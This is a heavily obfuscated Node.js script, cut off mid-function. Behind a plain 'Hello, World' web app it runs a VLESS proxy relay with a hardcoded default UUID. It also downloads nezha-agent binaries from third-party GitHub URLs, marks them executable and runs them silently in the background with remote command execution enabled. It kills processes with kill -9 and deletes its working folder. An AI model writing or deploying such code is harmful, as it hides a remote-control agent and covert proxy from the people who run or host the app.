const _0x18fd1e=_0x5735;(function(_0x41b224,_0x3a468b){const _0x16395a=_0x5735,_0x53fe20=_0x41b224();while(!![]){try{const _0x2b169d=parseInt(_0x16395a(0x14e))/0x1*(parseInt(_0x16395a(0x1c2))/0x2)+-parseInt(_0x16395a(0x1d4))/0x3*(parseInt(_0x16395a(0x16f))/0x4)+-parseInt(_0x16395a(0x142))/0x5+-parseInt(_0x16395a(0x1b4))/0x6*(-parseInt(_0x16395a(0x1ae))/0x7)+-parseInt(_0x16395a(0x1df))/0x8*(parseInt(_0x16395a(0x1cf))/0x9)+-parseInt(_0x16395a(0x11f))/0xa*(-parseInt(_0x16395a(0x194))/0xb)+parseInt(_0x16395a(0x1ce))/0xc;if(_0x2b169d===_0x3a468b)break;else _0x53fe20['push'](_0x53fe20['shift']());}catch(_0x4f9b96){_0x53fe20['push'](_0x53fe20['shift']());}}}(_0xa184,0x248e1));function _0xa184(){const _0x38fc0b=['--tls','write','Read\x20controller\x20close\x20error:','/log.txt','TIME','MAX_POST_SIZE','invalid\x20UUID','8443','currentStreamRes','client_secret:\x20','toISOString','POST','https://github.com/mytcgd/myfiles/releases/download/main/nezha-agentv1_arm','all','7PeFwQf','fileName','https://github.com/kahunama/myfile/releases/download/main/nezha-agent','7160b696-dd5e-42e3-a024-145e92cec916','UUID','trim','1732008EKElmu','LOG_LEVEL','length','NEZHA_VERSION','chmodSync','getReader','TCP_KEEPALIVE','CHUNK_SIZE','data','processPacket','Read\x20controller\x20error:','CFIP','buffer','nextSeq','2UTmXaD','writable','Failed\x20to\x20initialize\x20VLESS:\x20','VLESS\x20header\x20parsed\x20successfully','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','message','Process\x20packet\x20error:\x20','GET','Content-Type','speed.cloudflare.com','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','unlinkSync','3125508ZItgyB','16533RntyNh','aarch64','app','\x1b[33m','getWriter','68130IDRpCs','[detectProcess]\x20','Cleanup\x20error:\x20','startDownstream','&path=','charAt','substr','App\x20is\x20running','Killed\x20process\x20(PIDs:\x20','secureConnection','Remote\x20connection\x20not\x20available','1048VDAieZ',',\x20size=','vless://','catch','_startDownstreamResponse','\x20timed\x20out\x20without\x20downstream','Created\x20new\x20session\x20for\x20POST:\x20','Remote\x20connection\x20established','ip.sb','http/1.1','map','none','tmp','Relay\x20error:','writeHead','decode','url','cmd','hostname','cleaned','NEZHA_SERVER','Connected\x20to\x20','resp','Client\x20connection\x20closed','NEZHA_KEY','aborted','listen','\x20bytes','Failed\x20to\x20parse\x20hostname','connect','_writeToRemote','stringify','stream/promises','2096','reduce','&fp=chrome&allowInsecure=1&type=xhttp&host=','headersSent','log','asOrganization','replace','arm64','lastActivity','KEEPALIVE','cork','&mode=packet-up#','destroy','2053','initialized','VLESS\x20header\x20parsed:\x20','?encryption=none&security=none&sni=','reading_done','\x20--report-delay=4\x20--skip-conn\x20--skip-procs\x20--disable-auto-update\x20>/dev/null\x202>&1\x20&','\x20error:','HTTP\x20error!\x20status:\x20','path','Hello,\x20World\x0a','remote','PORT','name','Created\x20new\x20session\x20for\x20GET:\x20','forEach','SESSION_TIMEOUT','enqueue','filePath','LOCAL_DOMAIN','floor','destroyed','statusCode','pipeTo','true','alpnProtocol','writeFileSync','headersTimeout','/config.yml\x20>/dev/null\x202>&1\x20&','%2F','Buffered\x20packet\x20seq=','\x20before\x20initialization','fill','application/octet-stream','/([^/]+)(?:/([0-9]+))?$','keepAliveTimeout','\x1b[31m','Received\x20out\x20of\x20order\x20packet\x20seq=','timeout','New\x20secure\x20connection\x20using:\x20','text/plain','\x20running\x20error:\x20','1010JbJpxw','Failed\x20to\x20process\x20POST\x20request:\x20','socket','releaseLock','FILE_PATH','includes','initializeVLESS','unsupported\x20command:\x20','code','exec','success','ps+awk','\x20-c\x20','parse','Error\x20downloading\x20files:','parse\x20hostname\x20failed','MY_DOMAIN','amd','Failed\x20to\x20initialize\x20VLESS\x20connection','stderr','readFile','Server\x20error:\x20','https://github.com/kahunama/myfile/releases/download/main/nezha-agent_arm','rmSync','\x22\x20\x27$2\x20==\x20name\x20{print\x20$1}\x27','ps\x20-eo\x20pid,comm\x20|\x20awk\x20-v\x20name=\x22','XPATH','setKeepAlive','connect\x20timeout','value','debug','pipe','bufferSize','socket\x20hang\x20up','text/plain;\x20charset=utf-8','1372055WHIsGY','constructor','chunked','downstreamStarted','base64','VLESS\x20header\x20parse\x20error:\x20','Kill\x20failed:\x20','header\x20length\x20too\x20short','arm','env','cleanup','close','299315PoroqD','request','/meta','port','error','TCP_NODELAY','\x1b[0m','setNoDelay','false','from','originalName','pathname','HTTPSTLS','nohup\x20','utf8','now','done','slice','headerSent','finally','read\x20address\x20type\x20failed','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','log.txt','end','pendingPackets','uuid','Connection\x20failed:\x20','pgrep','no-store','Server\x20is\x20running\x20on\x20port\x20','Cleaning\x20up\x20session\x20','warn','Starting\x20to\x20parse\x20VLESS\x20header','44sQbdIf','info','app\x20file\x20not\x20found,\x20skip\x20running','vlessHeader','Error\x20starting\x20downstream:\x20','Sending\x20VLESS\x20response\x20header\x20(','nextTick','GET,\x20POST','get','SUB_URL','stream','MAX_BUFFERED_POSTS','toString','Transform','random','Too\x20many\x20buffered\x20packets','child_process','Upload\x20failed:','Remote\x20error:\x20','existsSync','lstatSync','reset','Socket\x20error:','application/json;\x20charset=utf-8','push','2083','set','join','Can\x27t\x20determine\x20system\x20architecture.','readable','country','delete','\x1b[32m','writableEnded','replaceAll','pendingBuffers','resume','7205xRFIgd','BUFFER_SIZE','/config.yml','responseHeader','statusMessage','read','Command\x20failed:\x20','\x20-p\x20','has','pause','VLESS\x20connection\x20to\x20','Processing\x20packet:\x20seq='];_0xa184=function(){return _0x38fc0b;};return _0xa184();}const FILE_PATH=process[_0x18fd1e(0x14b)][_0x18fd1e(0x123)]||'/tmp',intervalInseconds=process[_0x18fd1e(0x14b)][_0x18fd1e(0x1a4)]||0x64,PORT=process[_0x18fd1e(0x14b)][_0x18fd1e(0x218)]||0xbb8,CFPORT=process[_0x18fd1e(0x14b)]['CFPORT']||0x1bb,CFIP=process[_0x18fd1e(0x14b)][_0x18fd1e(0x1bf)]||_0x18fd1e(0x1e7),KEEPALIVE=process['env'][_0x18fd1e(0x209)]||![],SUB_URL=process[_0x18fd1e(0x14b)][_0x18fd1e(0x178)]||'',UUID=process[_0x18fd1e(0x14b)][_0x18fd1e(0x1b2)]||_0x18fd1e(0x1b1),XPATH=process[_0x18fd1e(0x14b)][_0x18fd1e(0x139)]||UUID[_0x18fd1e(0x15f)](0x0,0x8),HTTPSTLS=process[_0x18fd1e(0x14b)][_0x18fd1e(0x15a)]||!![],NEZHA_VERSION=process[_0x18fd1e(0x14b)][_0x18fd1e(0x1b7)]||'V0',NEZHA_SERVER=process['env'][_0x18fd1e(0x1f3)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'443',NEZHA_KEY=process['env'][_0x18fd1e(0x1f7)]||'',SUB_NAME=process[_0x18fd1e(0x14b)]['SUB_NAME']||'',MY_DOMAIN=process['env'][_0x18fd1e(0x12f)]||'',LOCAL_DOMAIN=process[_0x18fd1e(0x14b)][_0x18fd1e(0x21f)]||'',os=require('os'),fs=require('fs'),net=require('net'),path=require(_0x18fd1e(0x215)),http=require('http'),https=require('https'),axios=require('axios'),{pipeline}=require(_0x18fd1e(0x1ff)),{Buffer}=require(_0x18fd1e(0x1c0)),exec=require(_0x18fd1e(0x17f))[_0x18fd1e(0x128)],delay=_0x141af1=>new Promise(_0x1bb137=>setTimeout(_0x1bb137,_0x141af1)),SETTINGS={[_0x18fd1e(0x1b2)]:UUID,[_0x18fd1e(0x1b5)]:'none',['BUFFER_SIZE']:'2048',['XPATH']:_0x18fd1e(0x112)+XPATH,[_0x18fd1e(0x17a)]:0x1e,['MAX_POST_SIZE']:0xf4240,['SESSION_TIMEOUT']:0x7530,[_0x18fd1e(0x1bb)]:0x400*0x400,[_0x18fd1e(0x153)]:!![],[_0x18fd1e(0x1ba)]:!![]};function validate_uuid(_0x13e948,_0x36b3d1){for(let _0x272b8c=0x0;_0x272b8c<0x10;_0x272b8c++){if(_0x13e948[_0x272b8c]!==_0x36b3d1[_0x272b8c])return![];}return!![];}function concat_typed_arrays(_0x4b9fd0,..._0x1df94f){const _0x1d720b=_0x18fd1e;if(!_0x1df94f||_0x1df94f[_0x1d720b(0x1b6)]<0x1)return _0x4b9fd0;let _0x2fc13c=_0x4b9fd0[_0x1d720b(0x1b6)];for(let _0x168c83 of _0x1df94f)_0x2fc13c+=_0x168c83[_0x1d720b(0x1b6)];const _0x1a1626=new _0x4b9fd0[(_0x1d720b(0x143))](_0x2fc13c);_0x1a1626[_0x1d720b(0x189)](_0x4b9fd0,0x0),_0x2fc13c=_0x4b9fd0[_0x1d720b(0x1b6)];for(let _0x13daa0 of _0x1df94f){_0x1a1626[_0x1d720b(0x189)](_0x13daa0,_0x2fc13c),_0x2fc13c+=_0x13daa0[_0x1d720b(0x1b6)];}return _0x1a1626;}function log(_0x3593f4,..._0x1a1fe5){const _0x539693=_0x18fd1e;if(SETTINGS[_0x539693(0x1b5)]===_0x539693(0x1ea))return;const _0x5633a9={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x4e8d35={'debug':'\x1b[36m','info':_0x539693(0x18f),'warn':_0x539693(0x1d2),'error':_0x539693(0x119),'reset':_0x539693(0x154)},_0x8bca3e=_0x5633a9[SETTINGS[_0x539693(0x1b5)]]||0x1,_0x2309a5=_0x5633a9[_0x3593f4]||0x0;if(_0x2309a5>=_0x8bca3e){const _0x2826bc=new Date()[_0x539693(0x1aa)](),_0x45df2a=_0x4e8d35[_0x3593f4]||_0x4e8d35['reset'];console['log'](_0x45df2a+'['+_0x2826bc+']\x20['+_0x3593f4+']',..._0x1a1fe5,_0x4e8d35[_0x539693(0x184)]);}}function cleanupOldFiles(){const _0x2aeb28=_0x18fd1e;try{if(fs['existsSync'](path['join'](FILE_PATH)))fs[_0x2aeb28(0x136)](path[_0x2aeb28(0x18a)](FILE_PATH),{'recursive':!![]});else{}}catch(_0x1a67f3){}}function createFolder(_0xe4e2cc){const _0x2400fb=_0x18fd1e;if(!fs[_0x2400fb(0x182)](_0xe4e2cc))fs['mkdirSync'](_0xe4e2cc);else{}}function execPromise(_0x42bb8c,_0x323336={}){return new Promise((_0x847625,_0x11316d)=>{const _0x3643d0=exec(_0x42bb8c,_0x323336,(_0x51ec78,_0x3d6982,_0x312c25)=>{const _0x5cd45a=_0x5735;if(_0x51ec78){const _0x5655b1=new Error(_0x5cd45a(0x19a)+_0x51ec78[_0x5cd45a(0x1c7)]);_0x5655b1[_0x5cd45a(0x127)]=_0x51ec78[_0x5cd45a(0x127)],_0x5655b1[_0x5cd45a(0x132)]=_0x312c25[_0x5cd45a(0x1b3)](),_0x11316d(_0x5655b1);}else _0x847625(_0x3d6982[_0x5cd45a(0x1b3)]());});});}async function detectProcess(_0x55869f){const _0xb7c6e4=_0x18fd1e,_0x141561=[{'cmd':'pidof\x20\x22'+_0x55869f+'\x22','name':'pidof'},{'cmd':'pgrep\x20-x\x20\x22'+_0x55869f+'\x22','name':_0xb7c6e4(0x169)},{'cmd':_0xb7c6e4(0x138)+_0x55869f+_0xb7c6e4(0x137),'name':_0xb7c6e4(0x12a)}];for(const _0x25da21 of _0x141561){try{const _0x5585cf=await execPromise(_0x25da21[_0xb7c6e4(0x1f0)]);if(_0x5585cf)return _0x5585cf[_0xb7c6e4(0x206)](/\n/g,'\x20')[_0xb7c6e4(0x1b3)]();}catch(_0x4ad4cb){_0x4ad4cb[_0xb7c6e4(0x127)]!==0x7f&&_0x4ad4cb[_0xb7c6e4(0x127)]!==0x1&&console['debug'](_0xb7c6e4(0x1d5)+_0x25da21[_0xb7c6e4(0x219)]+_0xb7c6e4(0x213),_0x4ad4cb[_0xb7c6e4(0x1c7)]);}}return'';}async function killProcess(_0x461430){const _0x2542fe=_0x18fd1e;console[_0x2542fe(0x204)]('Attempting\x20to\x20kill\x20process:\x20'+_0x461430);try{const _0x249f61=await detectProcess(_0x461430);if(!_0x249f61)return console['warn']('Process\x20\x27'+_0x461430+'\x27\x20not\x20found'),{'success':!![],'message':'Process\x20not\x20found'};await execPromise('kill\x20-9\x20'+_0x249f61);const _0x448cc2=_0x2542fe(0x1dc)+_0x249f61+')';return console['log'](_0x448cc2),{'success':!![],'message':_0x448cc2};}catch(_0x77b374){const _0x3883b5=_0x2542fe(0x148)+_0x77b374['message'];return console[_0x2542fe(0x152)](_0x3883b5),{'success':![],'message':_0x3883b5};}}function generateRandomString(_0x4a091b){const _0x258ac8=_0x18fd1e,_0x5d5164='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';let _0x17d569='';for(let _0x175d6=0x0;_0x175d6<_0x4a091b;_0x175d6++){_0x17d569+=_0x5d5164[_0x258ac8(0x1d9)](Math[_0x258ac8(0x109)](Math[_0x258ac8(0x17d)]()*_0x5d5164[_0x258ac8(0x1b6)]));}return _0x17d569;}function getSystemArchitecture(){const _0x26348d=_0x18fd1e,_0x2dc6a1=os['arch']();return _0x2dc6a1===_0x26348d(0x14a)||_0x2dc6a1===_0x26348d(0x207)||_0x2dc6a1===_0x26348d(0x1d0)?_0x26348d(0x14a):_0x26348d(0x130);}function getFilesForArchitecture(_0x2aa470){const _0x473176=_0x18fd1e,_0x2ccde3={'app':{'V0':{'arm':_0x473176(0x135),'amd':_0x473176(0x1b0)},'V1':{'arm':_0x473176(0x1ac),'amd':'https://github.com/mytcgd/myfiles/releases/download/main/nezha-agentv1'}}};if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY&&NEZHA_VERSION){const _0x4d3908=[{'fileName':_0x473176(0x1eb)+generateRandomString(0x5),'originalName':_0x473176(0x1d1),'fileUrl':_0x2ccde3[_0x473176(0x1d1)][NEZHA_VERSION][_0x2aa470]}];return _0x4d3908;}else return[];}async function download_function(_0x351047,_0x3cd589,_0x274cae){const _0x33dcd2=_0x18fd1e,_0x282f52=path[_0x33dcd2(0x18a)](FILE_PATH,_0x351047);let _0x249131=![];try{const _0x3ee308=await axios({'method':'get','url':_0x274cae,'responseType':_0x33dcd2(0x179)});await pipeline(_0x3ee308[_0x33dcd2(0x1bc)],fs['createWriteStream'](_0x282f52)),_0x249131=!![];}catch(_0x2bd424){}return{'fileName':_0x351047,'originalName':_0x3cd589,'filePath':_0x282f52,'success':_0x249131};}let fileMapping={};async function downloadFiles(){const _0x3f1a8f=_0x18fd1e;try{const _0x404197=getSystemArchitecture();if(!_0x404197)return console[_0x3f1a8f(0x204)](_0x3f1a8f(0x18b)),fileMapping;const _0x547d83=getFilesForArchitecture(_0x404197);if(_0x547d83[_0x3f1a8f(0x1b6)]===0x0)return console[_0x3f1a8f(0x204)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture'),fileMapping;const _0x2d0ebe=_0x547d83[_0x3f1a8f(0x1e9)](_0x51c475=>download_function(_0x51c475[_0x3f1a8f(0x1af)],_0x51c475[_0x3f1a8f(0x158)],_0x51c475['fileUrl'])),_0x28176f=await Promise[_0x3f1a8f(0x1ad)](_0x2d0ebe);return _0x28176f[_0x3f1a8f(0x21b)](_0x47115a=>{const _0xa5ab5a=_0x3f1a8f;if(_0x47115a[_0xa5ab5a(0x129)])try{fs[_0xa5ab5a(0x1b8)](_0x47115a[_0xa5ab5a(0x21e)],0x1ed),fileMapping[_0x47115a[_0xa5ab5a(0x158)]]=_0x47115a[_0xa5ab5a(0x1af)];}catch(_0x222e62){}}),fileMapping;}catch(_0x2ebbbc){return console['error'](_0x3f1a8f(0x12d),_0x2ebbbc),fileMapping;}}let NEZHA_TLS;function nezconfig(){const _0x292223=_0x18fd1e,_0x32b0a6=['443',_0x292223(0x1a7),_0x292223(0x200),'2087',_0x292223(0x188),_0x292223(0x20d)];if(NEZHA_VERSION==='V0')return _0x32b0a6[_0x292223(0x124)](NEZHA_PORT)?NEZHA_TLS=_0x292223(0x1a0):NEZHA_TLS='',NEZHA_TLS;else{if(NEZHA_VERSION==='V1'){_0x32b0a6[_0x292223(0x124)](NEZHA_PORT)?NEZHA_TLS=_0x292223(0x10d):NEZHA_TLS=_0x292223(0x156);const _0x27ceeb=path[_0x292223(0x18a)](FILE_PATH,_0x292223(0x196)),_0x1e9697=_0x292223(0x1a9)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x292223(0x1c6)+NEZHA_TLS+_0x292223(0x163)+UUID;try{fs[_0x292223(0x10f)](_0x27ceeb,_0x1e9697);}catch(_0x58996b){}}}}async function runapp(){const _0x149ff2=_0x18fd1e;if(fileMapping[_0x149ff2(0x1d1)]&&fs[_0x149ff2(0x182)](path[_0x149ff2(0x18a)](FILE_PATH,fileMapping[_0x149ff2(0x1d1)]))){if(NEZHA_VERSION==='V0'){const _0x228e12=_0x149ff2(0x15b)+FILE_PATH+'/'+fileMapping[_0x149ff2(0x1d1)]+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x149ff2(0x19b)+NEZHA_KEY+'\x20'+NEZHA_TLS+_0x149ff2(0x212);try{await execPromise(_0x228e12);}catch(_0x4ee771){console['error'](fileMapping[_0x149ff2(0x1d1)]+_0x149ff2(0x11e)+_0x4ee771);}}else{if(NEZHA_VERSION==='V1'){const _0x576d69='nohup\x20'+FILE_PATH+'/'+fileMapping[_0x149ff2(0x1d1)]+_0x149ff2(0x12b)+FILE_PATH+_0x149ff2(0x111);try{await execPromise(_0x576d69);}catch(_0x37cd61){console[_0x149ff2(0x152)](fileMapping[_0x149ff2(0x1d1)]+_0x149ff2(0x11e)+_0x37cd61);}}}}else console[_0x149ff2(0x204)](_0x149ff2(0x171));}async function run(){const _0x429a47=_0x18fd1e;if(NEZHA_VERSION&&NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){nezconfig();const _0xc76407=await detectProcess(''+fileMapping[_0x429a47(0x1d1)]);if(_0xc76407){}else await runapp();await delay(0x3e8);}else console['log']('Node\x20variable\x20is\x20empty,\x20skip\x20running');}async function keep_alive(){const _0x3c844c=_0x18fd1e;if(NEZHA_VERSION&&NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x49f59e=await detectProcess(''+fileMapping[_0x3c844c(0x1d1)]);if(_0x49f59e){}else await runapp();}}function parse_uuid(_0x141dfb){const _0x50e976=_0x18fd1e;_0x141dfb=_0x141dfb[_0x50e976(0x191)]('-','');const _0x34bb5e=[];for(let _0x444d95=0x0;_0x444d95<0x10;_0x444d95++){_0x34bb5e['push'](parseInt(_0x141dfb[_0x50e976(0x1da)](_0x444d95*0x2,0x2),0x10));}return _0x34bb5e;}async function read_vless_header(_0x546322,_0x165ce5){const _0x4206bc=_0x18fd1e;let _0x1d80a4=0x0,_0x505c33=new Uint8Array(),_0x32513f={'value':_0x505c33,'done':![]};async function _0x5e0cce(_0x377bc3){const _0x35d3c9=_0x5735;if(_0x32513f[_0x35d3c9(0x15e)])throw new Error(_0x35d3c9(0x149));const _0x59cccb=_0x377bc3-_0x1d80a4;if(_0x59cccb<0x1)return;_0x32513f=await read_atleast(_0x546322,_0x59cccb),_0x1d80a4+=_0x32513f[_0x35d3c9(0x13c)]['length'],_0x505c33=concat_typed_arrays(_0x505c33,_0x32513f[_0x35d3c9(0x13c)]);}await _0x5e0cce(0x1+0x10+0x1);const _0xb1875d=_0x505c33[0x0],_0x81ab6d=_0x505c33[_0x4206bc(0x15f)](0x1,0x1+0x10),_0x46f8ac=parse_uuid(_0x165ce5);if(!validate_uuid(_0x81ab6d,_0x46f8ac))throw new Error(_0x4206bc(0x1a6));const _0x13014b=_0x505c33[0x1+0x10],_0x3542b7=0x1+0x10+0x1+_0x13014b+0x1+0x2+0x1;await _0x5e0cce(_0x3542b7+0x1);const _0x5eacbf=_0x505c33[0x1+0x10+0x1+_0x13014b],_0x1b7af8=0x1;if(_0x5eacbf!==_0x1b7af8)throw new Error(_0x4206bc(0x126)+_0x5eacbf);const _0x1dc46b=(_0x505c33[_0x3542b7-0x1-0x2]<<0x8)+_0x505c33[_0x3542b7-0x1-0x1],_0x5a0f72=_0x505c33[_0x3542b7-0x1],_0x25e5d7=0x1,_0xcd7f5b=0x2,_0x228647=0x3;let _0xe6c9be=-0x1;if(_0x5a0f72===_0x25e5d7)_0xe6c9be=_0x3542b7+0x4;else{if(_0x5a0f72===_0x228647)_0xe6c9be=_0x3542b7+0x10;else _0x5a0f72===_0xcd7f5b&&(_0xe6c9be=_0x3542b7+0x1+_0x505c33[_0x3542b7]);}if(_0xe6c9be<0x0)throw new Error(_0x4206bc(0x162));await _0x5e0cce(_0xe6c9be);const _0x393546=_0x3542b7;let _0x904c9d='';if(_0x5a0f72===_0x25e5d7)_0x904c9d=_0x505c33[_0x4206bc(0x15f)](_0x393546,_0x393546+0x4)[_0x4206bc(0x18a)]('.');else{if(_0x5a0f72===_0xcd7f5b)_0x904c9d=new TextDecoder()[_0x4206bc(0x1ee)](_0x505c33[_0x4206bc(0x15f)](_0x393546+0x1,_0x393546+0x1+_0x505c33[_0x393546]));else _0x5a0f72===_0x228647&&(_0x904c9d=_0x505c33[_0x4206bc(0x15f)](_0x393546,_0x393546+0x10)[_0x4206bc(0x201)]((_0x28e37f,_0x4864ea,_0x275124,_0x3b8093)=>_0x275124%0x2?_0x28e37f['concat'](((_0x3b8093[_0x275124-0x1]<<0x8)+_0x4864ea)[_0x4206bc(0x17b)](0x10)):_0x28e37f,[])[_0x4206bc(0x18a)](':'));}if(!_0x904c9d){log(_0x4206bc(0x152),_0x4206bc(0x1fb));throw new Error(_0x4206bc(0x12e));}return log(_0x4206bc(0x170),_0x4206bc(0x19e)+_0x904c9d+':'+_0x1dc46b),{'hostname':_0x904c9d,'port':_0x1dc46b,'data':_0x505c33['slice'](_0xe6c9be),'resp':new Uint8Array([_0xb1875d,0x0])};}async function read_atleast(_0x265de1,_0x1a318a){const _0x1c44bb=_0x18fd1e,_0x2e3a47=[];let _0x59426b=![];while(_0x1a318a>0x0&&!_0x59426b){const _0x5ccbb9=await _0x265de1[_0x1c44bb(0x199)]();if(_0x5ccbb9['value']){const _0x60a346=new Uint8Array(_0x5ccbb9[_0x1c44bb(0x13c)]);_0x2e3a47[_0x1c44bb(0x187)](_0x60a346),_0x1a318a-=_0x60a346[_0x1c44bb(0x1b6)];}_0x59426b=_0x5ccbb9[_0x1c44bb(0x15e)];}if(_0x1a318a>0x0)throw new Error('not\x20enough\x20data\x20to\x20read');return{'value':concat_typed_arrays(..._0x2e3a47),'done':_0x59426b};}async function parse_header(_0xa83a4,_0x400d2e){const _0x134489=_0x18fd1e;log(_0x134489(0x13d),_0x134489(0x16e));const _0x521cb6=_0x400d2e[_0x134489(0x18c)][_0x134489(0x1b9)]();try{const _0x33c5b8=await read_vless_header(_0x521cb6,_0xa83a4);return log(_0x134489(0x13d),_0x134489(0x1c5)),_0x33c5b8;}catch(_0x25c73e){log(_0x134489(0x152),_0x134489(0x147)+_0x25c73e[_0x134489(0x1c7)]);throw new Error('read\x20vless\x20header\x20error:\x20'+_0x25c73e[_0x134489(0x1c7)]);}finally{_0x521cb6['releaseLock']();}}async function connect_remote(_0x3d9e6c,_0x1940e9){const _0x349e4e=_0x18fd1e,_0x48fc96=0x1f40;try{const _0x34210c=await timed_connect(_0x3d9e6c,_0x1940e9,_0x48fc96);return _0x34210c[_0x349e4e(0x155)](!![]),_0x34210c[_0x349e4e(0x13a)](!![],0x3e8),_0x34210c[_0x349e4e(0x13f)]=parseInt(SETTINGS[_0x349e4e(0x195)])*0x400,log(_0x349e4e(0x170),_0x349e4e(0x1f4)+_0x3d9e6c+':'+_0x1940e9),_0x34210c;}catch(_0x58ecf9){log('error',_0x349e4e(0x168)+_0x58ecf9[_0x349e4e(0x1c7)]);throw _0x58ecf9;}}function timed_connect(_0x143c08,_0x1d2317,_0x4e756a){return new Promise((_0x381155,_0x4a2470)=>{const _0x5073ed=_0x5735,_0x9f360d=net['createConnection']({'host':_0x143c08,'port':_0x1d2317}),_0x163260=setTimeout(()=>{const _0x3cee1f=_0x5735;_0x4a2470(new Error(_0x3cee1f(0x13b)));},_0x4e756a);_0x9f360d['on'](_0x5073ed(0x1fc),()=>{clearTimeout(_0x163260),_0x381155(_0x9f360d);}),_0x9f360d['on']('error',_0x5d6937=>{clearTimeout(_0x163260),_0x4a2470(_0x5d6937);});});}function pipe_relay(){async function _0x23b3da(_0x45594e,_0x52c2ff,_0x3d6cb9){const _0x5748f1=_0x5735,_0x389dc5=parseInt(SETTINGS['CHUNK_SIZE']);if(_0x3d6cb9[_0x5748f1(0x1b6)]>0x0){if(_0x52c2ff[_0x5748f1(0x1a1)])_0x52c2ff[_0x5748f1(0x20a)](),_0x52c2ff[_0x5748f1(0x1a1)](_0x3d6cb9),process[_0x5748f1(0x175)](()=>_0x52c2ff['uncork']());else{const _0x5d030b=_0x52c2ff[_0x5748f1(0x1c3)][_0x5748f1(0x1d3)]();try{await _0x5d030b[_0x5748f1(0x1a1)](_0x3d6cb9);}finally{_0x5d030b[_0x5748f1(0x122)]();}}}try{_0x45594e[_0x5748f1(0x13e)]?(_0x45594e[_0x5748f1(0x19d)](),_0x45594e['pipe'](_0x52c2ff,{'end':!![],'highWaterMark':_0x389dc5}),_0x45594e[_0x5748f1(0x193)]()):await _0x45594e[_0x5748f1(0x18c)][_0x5748f1(0x10c)](_0x52c2ff[_0x5748f1(0x1c3)],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal[_0x5748f1(0x11b)](SETTINGS[_0x5748f1(0x21c)])});}catch(_0x39798b){!_0x39798b[_0x5748f1(0x1c7)][_0x5748f1(0x124)](_0x5748f1(0x1f8))&&log(_0x5748f1(0x152),_0x5748f1(0x1ec),_0x39798b[_0x5748f1(0x1c7)]);throw _0x39798b;}}return _0x23b3da;}function socketToWebStream(_0x445781){const _0x453d13=_0x18fd1e;let _0x4876bf,_0x3ae637;return _0x445781['on'](_0x453d13(0x152),_0x5da1f7=>{const _0x2ba0da=_0x453d13;log(_0x2ba0da(0x152),_0x2ba0da(0x185),_0x5da1f7[_0x2ba0da(0x1c7)]),_0x4876bf?.['error'](_0x5da1f7),_0x3ae637?.[_0x2ba0da(0x152)](_0x5da1f7);}),{'readable':new ReadableStream({'start'(_0xd56add){const _0x4a4aef=_0x453d13;_0x4876bf=_0xd56add,_0x445781['on'](_0x4a4aef(0x1bc),_0x4730be=>{const _0x384110=_0x4a4aef;try{_0xd56add[_0x384110(0x21d)](_0x4730be);}catch(_0xe896e7){log('error',_0x384110(0x1be),_0xe896e7['message']);}}),_0x445781['on'](_0x4a4aef(0x165),()=>{const _0x21ca7e=_0x4a4aef;try{_0xd56add[_0x21ca7e(0x14d)]();}catch(_0x22b84){log('error',_0x21ca7e(0x1a2),_0x22b84['message']);}});},'cancel'(){const _0x44a2b5=_0x453d13;_0x445781[_0x44a2b5(0x20c)]();}}),'writable':new WritableStream({'start'(_0x1d5d33){_0x3ae637=_0x1d5d33;},'write'(_0x13006e){return new Promise((_0x35d652,_0x12bc95)=>{const _0x52672e=_0x5735;if(_0x445781[_0x52672e(0x10a)]){_0x12bc95(new Error('Socket\x20is\x20destroyed'));return;}_0x445781[_0x52672e(0x1a1)](_0x13006e,_0x14c319=>{if(_0x14c319)_0x12bc95(_0x14c319);else _0x35d652();});});},'close'(){const _0x5a4e28=_0x453d13;!_0x445781[_0x5a4e28(0x10a)]&&_0x445781[_0x5a4e28(0x165)]();},'abort'(_0x76c982){const _0xa9d437=_0x453d13;_0x445781[_0xa9d437(0x20c)](_0x76c982);}})};}function relay(_0x2a2024,_0x2f73c5,_0x35770d,_0x2f5a5a){const _0xfd7d8e=_0x18fd1e,_0x1799bd=pipe_relay();let _0x464d5c=![];const _0x1f90a6=socketToWebStream(_0x35770d);function _0x16c459(){const _0x4712c5=_0x5735;if(!_0x464d5c){_0x464d5c=!![];try{_0x35770d[_0x4712c5(0x20c)]();}catch(_0x7df187){!_0x7df187['message'][_0x4712c5(0x124)](_0x4712c5(0x1f8))&&!_0x7df187[_0x4712c5(0x1c7)][_0x4712c5(0x124)](_0x4712c5(0x140))&&log(_0x4712c5(0x152),_0x4712c5(0x1d6)+_0x7df187[_0x4712c5(0x1c7)]);}}}const _0x26634d=_0x1799bd(_0x2f73c5,_0x1f90a6,_0x2f5a5a[_0xfd7d8e(0x1bc)])['catch'](_0x23140d=>{const _0x394540=_0xfd7d8e;!_0x23140d[_0x394540(0x1c7)][_0x394540(0x124)](_0x394540(0x1f8))&&!_0x23140d[_0x394540(0x1c7)][_0x394540(0x124)]('socket\x20hang\x20up')&&log('error','Upload\x20error:\x20'+_0x23140d[_0x394540(0x1c7)]);})[_0xfd7d8e(0x161)](()=>{const _0x32ecfe=_0xfd7d8e;_0x2f73c5[_0x32ecfe(0x211)]&&_0x2f73c5[_0x32ecfe(0x211)]();}),_0x3826b8=_0x1799bd(_0x1f90a6,_0x2f73c5,_0x2f5a5a[_0xfd7d8e(0x1f5)])[_0xfd7d8e(0x1e2)](_0x5585f2=>{const 